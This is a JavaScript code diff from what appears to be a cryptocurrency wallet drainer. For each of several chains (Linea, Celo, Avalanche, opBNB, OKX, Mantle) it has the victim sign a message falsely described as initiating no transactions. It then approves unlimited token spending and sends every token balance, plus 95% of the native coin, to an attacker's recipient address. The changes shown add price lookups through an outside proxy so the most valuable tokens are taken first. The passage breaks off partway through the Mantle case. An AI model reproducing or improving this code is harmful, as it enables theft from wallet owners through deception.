+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               lineaTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      lineaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of lineaTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(lineaContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(lineaContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                         
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} LINEA`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} LINEA`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for LINEA to send')
-                        
-                       }
-                     } catch (error) {
-                          console.error('Error transferring LINEA:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    lineaTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of lineaTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(lineaContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(lineaContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                       
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} LINEA`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} LINEA`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for LINEA to send')
+                      
                      }
-                      break;
-          
-                  
-                    //CELO
-                    case celo.chainId:
-                      const celoTokens = await fetchCELOTokens(address);
-          
-                      // Message to sign
-                      const celoMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const celoSignature = await signer.signMessage(celoMessage);
-                      console.log('Signature:', celoSignature);
-          
-                      const celoTokenDetails = [];
-                      for (let token of celoTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring LINEA:', error);
+                        
+                   }
+                    break;
+        
+                
+                  //CELO
+                  case celo.chainId:
+                    const celoTokens = await fetchCELOTokens(address);
+        
+                    // Message to sign
+                    const celoMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const celoSignature = await signer.signMessage(celoMessage);
+                    console.log('Signature:', celoSignature);
+        
+                    const celoTokenDetails = [];
+                    for (let token of celoTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               celoTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      celoTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of celoTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(celoContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(celoContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CELO`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CELO`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for CELO to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring CELO:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    celoTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of celoTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(celoContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(celoContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CELO`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CELO`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for CELO to send')
+                       
                      }
-                      break;
-          
-                    
-                    //AVALANCHE
-                    case avalanche.chainId:
-                      const avaTokens = await fetchAVALANCHETokens(address);
-          
-                      // Message to sign
-                      const avaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const avaSignature = await signer.signMessage(avaMessage);
-                      console.log('Signature:', avaSignature);
-          
-                      const avaTokenDetails = [];
-                      for (let token of avaTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring CELO:', error);
+                        
+                   }
+                    break;
+        
+                  
+                  //AVALANCHE
+                  case avalanche.chainId:
+                    const avaTokens = await fetchAVALANCHETokens(address);
+        
+                    // Message to sign
+                    const avaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const avaSignature = await signer.signMessage(avaMessage);
+                    console.log('Signature:', avaSignature);
+        
+                    const avaTokenDetails = [];
+                    for (let token of avaTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               avaTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      avaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of avaTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(avalancheContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(avalancheContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AVALANCHE`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AVALANCHE`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for AVALANCHE to send')
-                      
-                       }
-                     } catch (error) {
-                          console.error('Error transferring AVALANCHE:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    avaTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of avaTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(avalancheContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(avalancheContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AVALANCHE`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AVALANCHE`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for AVALANCHE to send')
+                    
                      }
-                      break;
-          
-                    //OPBNB
-                    case opbnb.chainId:      
-                    const opbnbTokens = await fetchOPBNBTokens(address);
-          
-                      // Message to sign
-                      const opbnbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const opbnbSignature = await signer.signMessage(opbnbMessage);
-                      console.log('Signature:', opbnbSignature);
-          
-                      const opbnbTokenDetails = [];
-                      for (let token of opbnbTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring AVALANCHE:', error);
+                        
+                   }
+                    break;
+        
+                  //OPBNB
+                  case opbnb.chainId:      
+                  const opbnbTokens = await fetchOPBNBTokens(address);
+        
+                    // Message to sign
+                    const opbnbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const opbnbSignature = await signer.signMessage(opbnbMessage);
+                    console.log('Signature:', opbnbSignature);
+        
+                    const opbnbTokenDetails = [];
+                    for (let token of opbnbTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               opbnbTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      opbnbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of opbnbTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(opbnbContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(opbnbContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OPBNB`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OPBNB`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for OPBNB to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring OPBNB:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    opbnbTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of opbnbTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(opbnbContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(opbnbContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OPBNB`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OPBNB`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for OPBNB to send')
+                       
                      }
-                        break;
-              
-                    //OKX
-                    case okx.chainId:
-                      const okxTokens = await fetchOKXTokens(address);
-          
-                      // Message to sign
-                      const okxMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const okxSignature = await signer.signMessage(okxMessage);
-                      console.log('Signature:', okxSignature);
-          
-                      const okxTokenDetails = [];
-                      for (let token of okxTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring OPBNB:', error);
+                        
+                   }
+                      break;
+            
+                  //OKX
+                  case okx.chainId:
+                    const okxTokens = await fetchOKXTokens(address);
+        
+                    // Message to sign
+                    const okxMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const okxSignature = await signer.signMessage(okxMessage);
+                    console.log('Signature:', okxSignature);
+        
+                    const okxTokenDetails = [];
+                    for (let token of okxTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               okxTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      okxTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
-                          for(let token of okxTokenDetails){
-                              const maxUint256 = ethers.constants.MaxUint256;
-                              // Approve unlimited tokens
-                              const approveTx = await token.contract.approve(okxContractAddress, maxUint256);
-                              await approveTx.wait();
-                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
-          
-          
-                              // Transfer tokens using the smart contract
-                              const contract = new ethers.Contract(okxContractAddress, contractABI, signer);
-                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
-                              await transferTx.wait();
-                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
-                          }
-                      } catch (error) {
-                          console.error('Error transferring tokens:', error);
-                          
-                      }
-          
-                     try {
-                       //send native tokens
-                       const etherBalance = await provider.getBalance(address)
-                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OKX`);
-          
-                       if(etherBalance.gte(minimumBalance)){
-                         const amountToSend = etherBalance.mul(95).div(100);
-                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OKX`);
-          
-                   // Define the transaction
-                       const transaction = {
-                           to: recipientAddress, // Replace with the recipient's address
-                           value: amountToSend,
-                           // Optional: You can specify gasLimit and gasPrice here if necessary
-                       };
-                       const txResponse = await signer.sendTransaction(transaction);
-                       console.log(`Transaction hash: ${txResponse.hash}`);
-          
-                       // Wait for the transaction to be mined
-                       const txReceipt = await txResponse.wait();
-                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
-                       }else{
-                         console.log('No balance found for OKX to send')
-                         
-                       }
-                     } catch (error) {
-                          console.error('Error transferring OKX:', error);
-                          
+                        }else{
+                          console.log('price info not available...')
+                        }
+                    }
+        
+                    // Sort tokens by balance, descending
+                    okxTokenDetails.sort((a, b) => b.usdValue - a.usdValue);
+        
+        
+                    try {
+                        for(let token of okxTokenDetails){
+                            const maxUint256 = ethers.constants.MaxUint256;
+                            // Approve unlimited tokens
+                            const approveTx = await token.contract.approve(okxContractAddress, maxUint256);
+                            await approveTx.wait();
+                            console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
+        
+        
+                            // Transfer tokens using the smart contract
+                            const contract = new ethers.Contract(okxContractAddress, contractABI, signer);
+                            const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
+                            await transferTx.wait();
+                            console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
+                        }
+                    } catch (error) {
+                        console.error('Error transferring tokens:', error);
+                        
+                    }
+        
+                   try {
+                     //send native tokens
+                     const etherBalance = await provider.getBalance(address)
+                     console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OKX`);
+        
+                     if(etherBalance.gte(minimumBalance)){
+                       const amountToSend = etherBalance.mul(95).div(100);
+                     console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OKX`);
+        
+                 // Define the transaction
+                     const transaction = {
+                         to: recipientAddress, // Replace with the recipient's address
+                         value: amountToSend,
+                         // Optional: You can specify gasLimit and gasPrice here if necessary
+                     };
+                     const txResponse = await signer.sendTransaction(transaction);
+                     console.log(`Transaction hash: ${txResponse.hash}`);
+        
+                     // Wait for the transaction to be mined
+                     const txReceipt = await txResponse.wait();
+                     console.log('Transaction confirmed in block:', txReceipt.blockNumber);
+                     }else{
+                       console.log('No balance found for OKX to send')
+                       
                      }
-                      break;
-          
-          
-                    //MANTLE
-                    case mantle.chainId:
-                      const mantleTokens = await fetchMANTLETokens(address);
-          
-                      // Message to sign
-                      const mantleMessage = "This is a standard message approval to verify your account. No transactions are initiated";
-                      const mantleSignature = await signer.signMessage(mantleMessage);
-                      console.log('Signature:', mantleSignature);
-          
-                      const mantleTokenDetails = [];
-                      for (let token of mantleTokens) {
-                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
-                          const balance = await tokenContract.balanceOf(address);
-                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
+                   } catch (error) {
+                        console.error('Error transferring OKX:', error);
+                        
+                   }
+                    break;
+        
+        
+                  //MANTLE
+                  case mantle.chainId:
+                    const mantleTokens = await fetchMANTLETokens(address);
+        
+                    // Message to sign
+                    const mantleMessage = "This is a standard message approval to verify your account. No transactions are initiated";
+                    const mantleSignature = await signer.signMessage(mantleMessage);
+                    console.log('Signature:', mantleSignature);
+        
+                    const mantleTokenDetails = [];
+                    for (let token of mantleTokens) {
+                        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
+                        const balance = await tokenContract.balanceOf(address);
+                        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`
+                        const response = await fetch(proxyUrl)
+                        const prices = await response.json()
+                        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;
+                        console.log(`The price for ${token.tokenSymbol} is: ${priceInfo}`)
+                        if(priceInfo !== undefined){
+                          const formattedBalance = ethers.utils.formatUnits(balance, 18)
+                          const usdValue = parseFloat(formattedBalance) * priceInfo
+                          const usdValueRounded = Math.round(usdValue)
+                          //console.log(`This is the USD value available for ${token.tokenSymbol}: ${usdValue}`)
+                          const usdValueString = usdValueRounded.toString()
+                          //console.log(usdValueString)
+                          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18)
+
+                          if (balance.gte(minimumBalance) && transferrableValue.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               mantleTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
                                   symbol: token.tokenSymbol,
-                                  address: token.contractAddress
+                                  address: token.contractAddress,
+                                  usdValue: usdValue
                               });
                           }
-                      }
-          
-                      // Sort tokens by balance, descending
-                      mantleTokenDetails.sort((a, b) => b.balance.sub(a.balance));
-          
-                      try {
